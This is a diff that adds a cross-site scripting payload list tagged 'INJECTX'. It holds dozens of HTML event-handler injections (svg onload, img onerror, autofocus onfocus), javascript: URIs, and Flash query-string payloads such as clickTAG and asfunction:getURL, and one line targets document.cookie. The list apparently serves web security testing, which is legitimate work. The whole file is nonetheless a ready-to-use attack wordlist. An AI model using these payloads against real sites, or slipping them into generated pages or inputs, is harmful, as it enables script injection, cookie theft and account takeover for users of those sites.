@@ -1,0 +1,63 @@
+javascript:alert(1)
+<svg/onload=alert(1)>
+<img onload=alert(1)>
+<img src=x onerror=prompt(1)>
+<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
+ onmouseover="document.cookie=true;">
+alert(1)>
+<h1>INJECTX</h1>
+<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
+<svg><script>/<@/>alert(1)</script>
+<svg/onload=alert(/INJECTX/)>
+<iframe/onload=alert(/INJECTX/)>
+<svg/onload=alert`INJECTX`>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(`INJECTX`)>
+}alert(/INJECTX/);{//
+<h1/onclick=alert(1)>a
+<svg/onload=alert(/INJECTX/)>
+<p/onclick=alert(/INJECTX/)>a
+<svg/onload=alert`INJECTX`>
+<svg/onload=alert(/INJECTX/)>
+<svg/onload=alert(`INJECTX`)>
+<video><source onerror="javascript:alert(1)">
+<video onerror="javascript:alert(1)"><source>
+<audio onerror="javascript:alert(1)"><source>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<button form=test onformchange=alert(1)>
+<form><button formaction="javascript:alert(1)">
+<svg onload=(alert)(1) >
+<script>$=1,alert($)</script>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<img/src='x'onerror=alert(1)>
+<marguee/onstart=alert(1)>
+<script>alert(1)
+<script>alert(1)<!--INJECTX
+<marquee loop=1 width=0 onfinish=alert(1)>
+#getURL,javascript:alert(1)",
+#goto,javascript:alert(1)",	
+?javascript:alert(1)",
+?alert(1)",
+?getURL(javascript:alert(1))",
+?asfunction:getURL,javascript:alert(1)//",
+?getURL,javascript:alert(1)",
+?goto,javascript:alert(1)",		
+?clickTAG=javascript:alert(1)",
+?url=javascript:alert(1)",
+?clickTAG=javascript:alert(1)&TargetAS=",
+?TargetAS=javascript:alert(1)",
+?skinName=asfunction:getURL,javascript:alert(1)//",
+?baseurl=asfunction:getURL,javascript:alert(1)//",
+?base=javascript:alert(0)",                
+?onend=javascript:alert(1)//",
+?userDefined=');function someFunction(a){}alert(1)//",        
+?URI=javascript:alert(1)",
+?callback=javascript:alert(1)",
+?getURLValue=javascript:alert(1)",
+?goto=javascript:alert(1)",
+?pg=javascript:alert(1)",
+?page=javascript:alert(1)"
+?playerready=alert(document.cookie)
